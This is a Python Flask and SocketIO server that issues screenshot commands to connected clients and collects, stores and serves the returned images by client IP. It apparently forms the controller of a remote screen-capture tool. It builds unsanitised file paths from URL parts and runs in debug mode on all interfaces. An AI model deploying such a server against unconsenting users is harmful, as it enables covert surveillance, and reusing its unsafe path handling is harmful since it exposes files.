import base64
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
from flask_socketio import SocketIO
import os

app = Flask(__name__)
socketio = SocketIO(app)
clients = {}


def emit_command_to_client(ip, command):
    if clients[ip]['status'] == 'online':
        socketio.emit('command', {'command': command}, room=clients[ip]['sid'])
        return jsonify({'status': 'success', 'message': f'Command {command} sent to client {ip}.'}), 200
    elif clients[ip]['status'] == 'offline':
        return jsonify({'status': 'error', 'message': f'**🔴 Client {ip} is offline.**'}), 200
    else:
        return jsonify({'status': 'error', 'message': f'Client {ip} not found.'}), 200


@app.route('/api/v1/command', methods=['POST'])
def handle_command():
    command_data = request.get_json()
    command = command_data.get('command')
    ip = command_data.get('ip')

    if command == 'screenshot':
        return emit_command_to_client(ip, command)
    return jsonify({'status': 'error', 'message': 'Unrecognized command.'}), 400


@app.route('/api/v1/clients', methods=['GET'])
def get_clients():
    status_filter = request.args.get('status')
    if status_filter:
        filtered_clients = {ip: data for ip, data in clients.items() if data['status'] == status_filter}
    else:
        filtered_clients = clients

    clients_info = [{'name': f'Client {i + 1}', 'ip': ip, 'status': data['status']}
                    for i, (ip, data) in enumerate(filtered_clients.items())]
    return jsonify({'status': 'success', 'clients': clients_info}), 200


def list_screenshots(directory):
    if os.path.exists(directory):
        return [f"{directory}/{file}" for file in os.listdir(directory) if
                os.path.isfile(os.path.join(directory, file))]
    return []


@app.route('/api/v1/screenshot', methods=['GET'])
def get_screenshots():
    screenshots = [screenshot for ip in clients.keys() for screenshot in list_screenshots(f"screenshots/{ip}")]
    return jsonify(
        {'status': 'success', 'screenshots': screenshots if screenshots else "No screenshots available."}), 200


@app.route('/api/v1/screenshot/<ip>', methods=['GET'])
def get_screenshots_by_ip(ip):
    screenshots = list_screenshots(f"screenshots/{ip}")
    return jsonify({'status': 'success',
                    'screenshots': screenshots if screenshots else "No screenshots available for this IP."}), 200


@app.route('/api/v1/screenshot/<ip>/<screenshot>', methods=['GET'])
def get_screenshot(ip, screenshot):
    screenshot_path = f"screenshots/{ip}/{screenshot}"
    if os.path.exists(screenshot_path):
        return send_from_directory('screenshots', f"{ip}/{screenshot}")
    else:
        return jsonify({'status': 'error', 'message': 'Screenshot not found.'}), 404


@socketio.on('connect')
def handle_connect():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    clients[client_ip] = {'sid': request.sid, 'status': 'online'}
    print(f"Client {client_ip} connected and is now online.")


@socketio.on('screenshot_response')
def handle_screenshot(data):
    screenshot_bytes = base64.b64decode(data.get('screenshot'))
    client_ip = None
    for ip, client_data in clients.items():
        if client_data['sid'] == request.sid:
            client_ip = ip
            break
    if not client_ip:
        print("Client not found.")
        return
    screenshot_dir = f"screenshots/{client_ip}"
    os.makedirs(screenshot_dir, exist_ok=True)
    screenshot_path = f"{screenshot_dir}/{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
    with open(screenshot_path, 'wb') as f:
        f.write(screenshot_bytes)


@socketio.on('disconnect')
def handle_disconnect():
    client_ip = None
    for ip, data in clients.items():
        if data['sid'] == request.sid:
            client_ip = ip
            break
    if client_ip:
        clients[client_ip]['status'] = 'offline'
        print(f"Client {client_ip} disconnected and is now offline.")


if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
